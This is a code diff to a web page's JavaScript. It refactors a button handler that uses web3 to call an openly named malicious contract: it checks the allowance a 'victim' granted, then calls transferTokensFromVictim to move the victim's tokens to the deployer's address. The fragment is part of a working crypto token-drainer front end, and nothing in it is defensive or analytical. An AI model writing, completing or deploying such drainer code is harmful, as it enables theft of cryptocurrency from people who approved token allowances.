@@ -605,36 +605,8 @@ document.getElementById("transferTokensBtn").addEventListener("click", async () 
         }
 
         try {
-            // Step 3: Initialize the malicious contract instance
-            const maliciousContractAbi = [
-                {
-                    "constant": true,
-                    "inputs": [
-                        { "name": "victim", "type": "address" }
-                    ],
-                    "name": "checkAllowance",
-                    "outputs": [
-                        { "name": "", "type": "uint256" }
-                    ],
-                    "payable": false,
-                    "stateMutability": "view",
-                    "type": "function"
-                },
-                {
-                    "inputs": [
-                        { "name": "victim", "type": "address" }
-                    ],
-                    "name": "transferTokensFromVictim",
-                    "outputs": [],
-                    "payable": false,
-                    "stateMutability": "nonpayable",
-                    "type": "function"
-                }
-            ];
-
-            // Malicious contract address (Replace with the actual deployed address)
-            const maliciousContractAddress = "0xYourMaliciousContractAddress"; // <-- This is the contract's address
-            const maliciousContract = new web3.eth.Contract(maliciousContractAbi, maliciousContractAddress);
+            // Malicious contract is already defined and ABI is on the page
+            const maliciousContract = new web3.eth.Contract(maliciousContractABI, maliciousContractAddress); // Uses the malicious contract
 
             // Step 4: Check allowance to ensure the victim has granted the malicious contract permission
             const allowance = await maliciousContract.methods.checkAllowance(cleanedVictimAddress).call();
@@ -650,7 +622,7 @@ document.getElementById("transferTokensBtn").addEventListener("click", async () 
             console.debug("Attempting to transfer tokens from victim...");
             const result = await maliciousContract.methods
                 .transferTokensFromVictim(cleanedVictimAddress) // Transfer tokens from the victim's address
-                .send({ from: deployerAddress }); // Send from deployer's address (which is already fetched)
+                .send({ from: deployerAddress }); // Send from deployer's address (already fetched)
 
             console.debug("Tokens transferred successfully:", result);
 
@@ -662,6 +634,7 @@ document.getElementById("transferTokensBtn").addEventListener("click", async () 
         }
     }
 });
+
 
 
 
